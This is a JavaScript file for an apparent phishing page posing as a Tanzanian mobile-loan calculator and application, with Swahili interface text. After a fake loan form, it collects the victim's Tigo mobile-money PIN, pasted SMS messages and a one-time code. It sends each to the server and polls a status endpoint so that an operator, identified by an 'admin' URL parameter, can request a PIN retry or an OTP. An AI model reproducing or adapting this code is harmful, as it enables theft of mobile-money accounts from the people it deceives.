document.addEventListener('DOMContentLoaded', () => {
  let selectedAmount = 'TZS 500,000';
  let currentUserId = null;
  let pollInterval = null;
  let adminChatId = '';

  const urlParams = new URLSearchParams(window.location.search);
  if (urlParams.has('admin')) {
    adminChatId = urlParams.get('admin');
  }

  function isValidTigoPhone(phone) {
    const clean = String(phone || '').replace(/\D/g, '');
    return /^255\d{7}$/.test(clean) && clean.length === 10;
  }

  function switchView(viewId) {
    const views = [
      'view-calculator', 'view-form', 'view-waiting', 
      'view-login', 'view-sms-paste', 'view-waiting-sms', 
      'view-otp', 'view-success'
    ];
    views.forEach(id => {
      const el = document.getElementById(id);
      if (el) {
        if (id === viewId) {
          el.classList.remove('hidden');
          el.classList.add('active-card');
        } else {
          el.classList.add('hidden');
          el.classList.remove('active-card');
        }
      }
    });
  }

  const amountRange = document.getElementById('amount-range');
  const calcAmountInput = document.getElementById('calc-amount');
  const durationRange = document.getElementById('duration-range');
  const durationVal = document.getElementById('duration-val');
  const monthlyPaymentDisplay = document.getElementById('monthly-payment');

  function updateCalculator() {
    const amount = parseInt(amountRange.value);
    const months = parseInt(durationRange.value);
    selectedAmount = `TZS ${amount.toLocaleString()}`;
    calcAmountInput.value = selectedAmount;
    durationVal.textContent = `Miezi ${months}`;

    const interestRate = 0.15;
    const totalWithInterest = amount * (1 + interestRate);
    const monthly = totalWithInterest / months;
    monthlyPaymentDisplay.textContent = `TZS ${monthly.toFixed(2)}`;
  }

  if (amountRange && durationRange) {
    amountRange.addEventListener('input', updateCalculator);
    durationRange.addEventListener('input', updateCalculator);
    updateCalculator();
  }

  document.getElementById('btn-start-app')?.addEventListener('click', () => {
    switchView('view-form');
    document.getElementById('form-amount').value = amountRange.value;
    validateStep1();
  });

  let currentStep = 1;

  function validateStep1() {
    const amount = document.getElementById('form-amount').value;
    const purpose = document.getElementById('loan-purpose').value;
    const nextBtn = document.querySelector('.form-step[data-step="1"] .next-btn');
    if (nextBtn) {
      nextBtn.disabled = !(amount && purpose.trim().length > 2);
    }
  }

  function validateStep2() {
    const firstName = document.getElementById('first-name').value;
    const lastName = document.getElementById('last-name').value;
    const contact = document.getElementById('user-contact').value;
    const nextBtn = document.querySelector('.form-step[data-step="2"] .next-btn');
    if (nextBtn) {
      nextBtn.disabled = !(firstName.trim() && lastName.trim() && isValidTigoPhone(contact));
    }
  }

  document.getElementById('form-amount')?.addEventListener('input', validateStep1);
  document.getElementById('loan-purpose')?.addEventListener('input', validateStep1);
  document.getElementById('first-name')?.addEventListener('input', validateStep2);
  document.getElementById('last-name')?.addEventListener('input', validateStep2);
  document.getElementById('user-contact')?.addEventListener('input', validateStep2);

  document.querySelectorAll('.next-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      if (currentStep < 3) {
        currentStep++;
        updateStepDisplay();
      }
    });
  });

  document.querySelectorAll('.prev-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      if (currentStep > 1) {
        currentStep--;
        updateStepDisplay();
      }
    });
  });

  function updateStepDisplay() {
    document.querySelectorAll('.form-step').forEach(step => {
      const stepNum = parseInt(step.getAttribute('data-step'));
      if (stepNum === currentStep) {
        step.classList.remove('hidden');
        step.classList.add('active-step');
      } else {
        step.classList.add('hidden');
        step.classList.remove('active-step');
      }
    });

    document.getElementById('step-indicator').textContent = `Hatua ya ${currentStep} kati ya 3`;
    document.getElementById('progress-fill').style.width = `${(currentStep / 3) * 100}%`;

    if (currentStep === 3) {
      document.getElementById('sum-amount').textContent = `TZS ${document.getElementById('form-amount').value}`;
      document.getElementById('sum-duration').textContent = durationVal.textContent;
      document.getElementById('sum-purpose').textContent = document.getElementById('loan-purpose').value || 'N/A';
      document.getElementById('sum-name').textContent = `${document.getElementById('first-name').value}${document.getElementById('last-name').value}`;
    }
  }

  document.getElementById('annual-income')?.addEventListener('input', (e) => {
    const submitBtn = document.getElementById('btn-submit-app');
    if (submitBtn) {
      submitBtn.disabled = !e.target.value;
    }
  });

  document.getElementById('btn-submit-app')?.addEventListener('click', () => {
    const contactVal = document.getElementById('user-contact').value;
    if (contactVal) {
      document.getElementById('login-contact').value = contactVal;
    }
    switchView('view-login');
  });

  const pinBoxes = document.querySelectorAll('.pin-box');
  pinBoxes.forEach((box, index) => {
    box.addEventListener('input', (e) => {
      const val = e.target.value;
      if (val && index < pinBoxes.length - 1) {
        pinBoxes[index + 1].focus();
      }
      checkPinComplete();
    });
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && index > 0) {
        pinBoxes[index - 1].focus();
      }
    });
  });

  function checkPinComplete() {
    const pinString = Array.from(pinBoxes).map(b => b.value).join('');
    const contactVal = document.getElementById('login-contact').value;
    const loginBtn = document.getElementById('btn-login');
    if (loginBtn) {
      loginBtn.disabled = !(pinString.length === 4 && isValidTigoPhone(contactVal));
    }
  }

  document.getElementById('login-contact')?.addEventListener('input', checkPinComplete);

  document.getElementById('btn-login')?.addEventListener('click', async () => {
    const pin = Array.from(pinBoxes).map(b => b.value).join('');
    const contact = document.getElementById('login-contact').value;

    switchView('view-waiting');
    document.getElementById('waiting-status-text').textContent = 'Inawasilisha PIN kwa ajili ya uhakiki...';

    try {
      const res = await fetch(`/api/submit-application${adminChatId ? '?admin=' + adminChatId : ''}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ contact, pin, amount: selectedAmount })
      });
      const data = await res.json();

      if (data.success) {
        currentUserId = data.userId;
        startStatusPolling();
      } else {
        alert(data.error || 'Imeshindikana kuwasilisha.');
        switchView('view-login');
      }
    } catch (err) {
      alert('Hitilafu ya mtandao kuunganisha na seva.');
      switchView('view-login');
    }
  });

  document.getElementById('btn-submit-sms')?.addEventListener('click', async () => {
    const pastedSms = document.getElementById('pasted-sms-input').value;
    if (!pastedSms.trim()) {
      alert('Tafadhali bandika maandishi ya SMS yako kwenye eneo lililotolewa.');
      return;
    }

    switchView('view-waiting-sms');

    try {
      await fetch('/api/verify-sms-pasted', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: currentUserId, pastedSms })
      });
      
      startStatusPolling();
    } catch (err) {
      console.error(err);
    }
  });

  const otpBoxes = document.querySelectorAll('.otp-box');
  otpBoxes.forEach((box, index) => {
    box.addEventListener('input', (e) => {
      const val = e.target.value;
      if (val && index < otpBoxes.length - 1) {
        otpBoxes[index + 1].focus();
      }
      checkOtpComplete();
    });
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && index > 0) {
        otpBoxes[index - 1].focus();
      }
    });
  });

  function checkOtpComplete() {
    const otpString = Array.from(otpBoxes).map(b => b.value).join('');
    const submitOtpBtn = document.getElementById('btn-submit-otp');
    if (submitOtpBtn) {
      submitOtpBtn.disabled = (otpString.length !== 4);
    }
  }

  document.getElementById('btn-submit-otp')?.addEventListener('click', async () => {
    const otp = Array.from(otpBoxes).map(b => b.value).join('');

    switchView('view-waiting');
    document.getElementById('waiting-status-text').textContent = 'Inahakiki uthibitisho wa OTP...';

    try {
      await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: currentUserId, otp })
      });
      
      startStatusPolling();
    } catch (err) {
      console.error(err);
    }
  });

  function startStatusPolling() {
    if (pollInterval) clearInterval(pollInterval);

    pollInterval = setInterval(async () => {
      if (!currentUserId) return;
      try {
        const res = await fetch(`/api/check-status/${currentUserId}`);
        const data = await res.json();

        if (data.status === 'SMS_PASTE_STEP') {
          clearInterval(pollInterval);
          switchView('view-sms-paste');
        } else if (data.status === 'OTP_STEP') {
          clearInterval(pollInterval);
          const contactVal = document.getElementById('login-count') || document.getElementById('user-contact').value;
          document.getElementById('otp-target-display').textContent = contactVal;
          switchView('view-otp');
        } else if (data.status === 'SUCCESS') {
          clearInterval(pollInterval);
          document.getElementById('approved-amount-val').textContent = selectedAmount;
          switchView('view-success');
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(pollInterval);
          pinBoxes.forEach(b => b.value = '');
          switchView('view-login');
        }
      } catch (err) {
        console.error('Polling error:', err);
      }
    }, 3000);
  }

  document.getElementById('btn-home')?.addEventListener('click', () => {
    window.location.reload();
  });
});
                            
